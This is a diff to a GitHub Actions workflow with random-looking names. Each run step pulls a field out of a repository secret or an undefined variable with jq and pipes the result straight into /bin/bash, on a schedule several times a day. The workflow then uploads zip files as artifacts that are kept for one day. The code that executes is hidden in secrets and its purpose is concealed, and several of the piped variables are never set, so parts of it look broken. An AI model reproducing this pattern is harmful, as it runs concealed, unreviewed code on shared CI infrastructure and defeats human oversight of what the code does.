@@ -1,26 +1,26 @@
 name: shunzhuanganliang
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '36 1/6 * * *'
 
-jobs:  # 12528
+  schedule:
+    - cron: '56 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shunzhuanganliang
         env:
-          uo55: ${{ secrets.uo55 }}
+          s5687: ${{ secrets.s5687 }}
         run: |
-          echo $uo55 | jq -r .d5 | /bin/bash
-          echo $kr336 | jq -r .xbep1085 | /bin/bash
-          echo $zmwot6 | jq -r .nsg12 | /bin/bash
-          echo $nj88 | jq -r .tsnkd93319 | /bin/bash
-          echo $i1 | jq -r .nyn54001 | /bin/bash
-          echo $ztchu05304 | jq -r .kvo4806 | /bin/bash
-          echo $avip81 | jq -r .ns199 | /bin/bash
-          echo $lwj60069 | jq -r .njcew4 | /bin/bash
-          echo $q66 | jq -r .xdz6 | /bin/bash
+          printf '%s' "$s5687" | jq -r .hkr43 | /bin/bash
+          echo $vxjf111 | jq -r .dhow1 | /bin/bash
+          printf '%s' "$bb6" | jq -r .ue0467 | /bin/bash
+          echo $oqo7 | jq -r .mcw28 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kaq1Fy4G
+          path: "*.zip"
+          retention-days: 1
